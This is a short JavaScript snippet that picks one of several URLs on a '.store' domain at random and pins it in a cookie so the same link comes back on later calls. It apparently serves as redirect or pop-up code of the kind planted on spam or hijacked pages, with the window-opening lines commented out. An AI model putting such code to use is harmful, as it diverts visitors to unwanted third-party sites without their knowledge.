var aa = [
    'http://nddx.orfnc.store/group.php/index/index/id/42.html',
    'http://nddx.orfnc.store/group.php/index/index/id/48.html', 
    'http://nddx.orfnc.store/group.php/index/index/id/49.html', 
    'http://nddx.orfnc.store/group.php/index/index/id/50.html', 
    'http://nddx.orfnc.store/group.php/index/index/id/51.html',
    '',
    '',
    '',
    '',
    '',
    '',
     
    ];
var sj = aa[Math.floor(Math.random()*aa.length)];

function setCookie(name,value){
  var Days = 1;
  var exp = new Date();
  exp.setTime(exp.getTime() + 10*100);
  document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}
function getCookie(name){
  var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
  if(arr=document.cookie.match(reg))
    return unescape(arr[2]);
  else
    return null;
}
function sz(){
    if(!getCookie("http_R")){
        setCookie("http_R",sj);
        
        return sj ;
     //   window.open(sj)
    }else{
    var url=getCookie("http_R");
    return url ;
     //   window.open(url)
    }
}
